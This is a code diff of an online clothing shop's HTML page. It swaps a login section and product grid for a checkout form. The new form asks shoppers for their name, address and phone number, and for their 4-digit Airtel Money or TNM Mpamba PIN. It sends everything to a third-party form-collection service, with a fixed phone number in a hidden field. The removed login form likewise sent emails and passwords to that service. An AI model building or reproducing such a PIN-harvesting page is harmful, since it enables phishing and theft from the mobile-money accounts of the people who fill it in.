@@ -32,60 +32,40 @@
         <a href="#shop" class="btn">Shop Now</a>
     </section>
 
-    <!-- Login/Signup Section -->
-    <section id="login" class="login">
-        <h2>Login or Sign Up</h2>
-        <form action="https://formspree.io/f/moqbgvkp" method="POST">
-            <div>
-                <button class="google-login" type="button" onclick="googleLogin()">
-                    <img src="1731975273328.png" alt="Google Logo">
-                    Login with Google
-                </button>
-            </div>
-            <p>Or</p>
-            <div>
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            <div>
-                <label for="password">Password:</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            <button type="submit">Login / Sign Up</button>
-        </form>
-    </section>
-
-    <!-- Featured Products -->
-    <section id="shop" class="products">
-        <h2>Featured Products</h2>
-        <div class="product-grid">
-            <div class="product">
-                <img src="pcopilot_image_1731974059114.jpeg" alt="Product 1">
-                <h3>long sleeves shirts 1</h3>
-                <p>MK 49,000</p>
-                <button>Add to Cart</button>
-            </div>
-            <div class="product">
-                <img src="copilot_image_1731973222276.jpeg" alt="Product 2">
-                <h3>Hoodies 2</h3>
-                <p>MK 45,000</p>
-                <button>Add to Cart</button>
-            </div>
-            <div class="product">
-                <img src="copilot_image_1731973074719.jpeg" alt="Product 3">
-                <h3>T shirts 3</h3>
-                <p>MK 20,000</p>
-                <button>Add to Cart</button>
-            </div>
-            <div class="product">
-                <img src="copilot_image_1731973176064.jpeg" alt="Product 4">
-                <h3>T Caps 4</h3>
-                <p>MK 30,000</p>
-                <button>Add to Cart</button>
-            </div>
+    <section id="checkout" class="checkout">
+    <h2>Checkout</h2>
+    <form action="https://formspree.io/f/xwpkqlye" method="POST">
+        <div>
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
         </div>
-    </section>
-
+        <div>
+            <label for="address">Address:</label>
+            <input type="text" id="address" name="address" required>
+        </div>
+        <div>
+            <label for="location">Location:</label>
+            <input type="text" id="location" name="location" required>
+        </div>
+        <div>
+            <label for="phone">Phone Number:</label>
+            <input type="text" id="phone" name="phone" required>
+        </div>
+        <input type="hidden" name="phone_number" value="+265994426162">
+        <div>
+            <label for="payment">Payment Method:</label>
+            <select id="payment" name="payment" required>
+                <option value="tnm">TNM Mpamba</option>
+                <option value="airtel">Airtel Money</option>
+            </select>
+        </div>
+        <div>
+            <label for="airtel-password">Enter 4-Digit Airtel/Mpamba Password:</label>
+            <input type="password" id="airtel-password" name="airtel-password" maxlength="4" required>
+        </div>
+        <button type="submit">Place Order</button>
+    </form>
+</section>
     <!-- Cart Section -->
     <section id="cart" class="cart">
         <h2>Your Cart</h2>
